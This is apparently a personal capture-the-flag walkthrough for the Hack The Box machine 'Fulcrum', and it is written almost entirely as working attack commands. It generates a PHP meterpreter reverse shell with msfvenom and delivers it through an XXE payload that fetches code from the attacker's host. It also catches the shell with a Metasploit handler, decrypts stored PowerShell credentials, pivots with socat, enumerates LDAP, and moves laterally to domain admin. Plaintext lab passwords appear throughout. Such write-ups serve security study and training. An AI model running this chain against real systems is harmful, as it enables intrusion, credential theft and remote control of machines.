# Fulcrum
#### 10.10.10.62
###### Dotaplayer365

# General Notes


=> Host a php reverse shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.171 LPORT=4442 > dotashell.php

python -m SimpleHTTPServer 80

=> create xml.txt
xml.txt: 

<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY sp SYSTEM "http://127.0.0.1:4/index.php?page=http://10.10.14.171/dotashell">
]>
<r>&sp;</r>

=> start Listner
msfconsole
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set LHOST 
set LPORT 
run

=> Exec Payload
curl -d @xml.txt http://10.10.10.62:56423

=> decrypt Password present inside Fulcrum_Upload_to_Corp.ps1
Decrypt Password from ps1:
(New-Object System.Management.Automation.PSCredential 'N/A', $4).GetNetworkCredential().Password

Username: WebUser
Pass: M4ng£m£ntPa55

=> Connecting to remote powershell 

On meterpreter:
download this on the remote machine
https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat
make it executable
forward ports:
./socat tcp-listen:5986,reuseaddr,fork tcp:192.168.122.228:5986

./socat tcp-listen:5986,reuseaddr,fork tcp:10.10.10.62:5986

Use windows machine to get the remote powershell with this script
------------------------------------------------
$1 = 'WebUser'
$2 = '77,52,110,103,63,109,63,110,116,80,97,53,53,77,52,110,103,63,109,63,110,116,80,97,53,53,48,48,48,48,48,48' -split ','
$3 = '76492d1116743f0423413b16050a5345MgB8AEQAVABpAHoAWgBvAFUALwBXAHEAcABKAFoAQQBNAGEARgArAGYAVgBGAGcAPQA9AHwAOQAwADgANwAxADIAZgA1ADgANwBiADIAYQBjADgAZQAzAGYAOQBkADgANQAzADcAMQA3AGYAOQBhADMAZQAxAGQAYwA2AGIANQA3ADUAYQA1ADUAMwA2ADgAMgBmADUAZgA3AGQAMwA4AGQAOAA2ADIAMgAzAGIAYgAxADMANAA='
$4 = $3 | ConvertTo-SecureString -key $2
$5 = New-Object System.Management.Automation.PSCredential ($1, $4)

#Invoke-Command -Computer upload.fulcrum.local -Credential $5 -File Data.ps1
$o = New-PSSessionOption -SkipCACheck -SkipCNCheck
Enter-PSSEssion -Computer 192.168.1.106 -Credential $5 -UseSSL -SessionOption $o
------------------------------------------------

=> ps -aux on linux machine to find the cmdk names

10.25.25.1 => PfSense
10.25.25.2 => DC (LDAP)
10.25.25.3 => FILE Vm

=>Testing LDAP Creds to get Btables
------------------------------------------------
if ($env:computername  -eq $env:userdomain) { echo " no AD domain" } else { echo "must be in AD"}
no AD Domain
------------------------------------------------
$entry = new-object directoryservices.directoryentry("LDAP://dc.fulcrum.local/OU=People,DC=fulcrum,DC=local","FULCRUM\LDAP","PasswordForSearching123!")
$searcher = new-object directoryservices.directorysearcher($entry);
$searcher.filter = "(objectClass=user)";
$searcher.findAll() | Select Path
------------------------------------------------
$entry = new-object directoryservices.directoryentry("LDAP://dc.fulcrum.local/OU=People,DC=fulcrum,DC=local","FULCRUM\LDAP","PasswordForSearching123!")
$searcher = new-object directoryservices.directorysearcher($entry);
$searcher.filter ="(&(objectClass=user)(Name=*Bob*))"
$searcher.findAll() | Select Path
$searcher.filter ="(objectClass=user)"
$results = $searcher.findAll()
foreach($result in $results) { $user = $result.GetDirectoryEntry(); $user | Select * }
------------------------------------------------

=> Information about BTables User on the File Server
BTables@fulcrum.local
Username : BTables
Password : ++FileServerLogon12345++
Has logon rights to the file server

=> GET USER.TXT
 Invoke-Command -Computername file.fulcrum.local -ScriptBlock {type C:\Users\BTables\Desktop\user.txt} -credential $cred

=> Issue commands on file server
$session = New-PSSession –ComputerName file.fulcrum.local -credential $creds


Invoke-Command –Session $session –ScriptBlock {whoami}

=> There is check-auth.ps1 which has a script
Copy just the script into a ps1 file with tail 
ruin it with parameteres merged.txt
get domain admin creds 
923a,@fulcrum_bf392748ef4e_$

=> get root.txt
Invoke-Command -ComputerName File.fulcrum.local -Credential $creds -ScriptBlock {Invoke
-Command -ComputerName dc.fulcrum.local -Credential $creds -ScriptBlock {type ../../Administrator/Desktop/root.txt}}


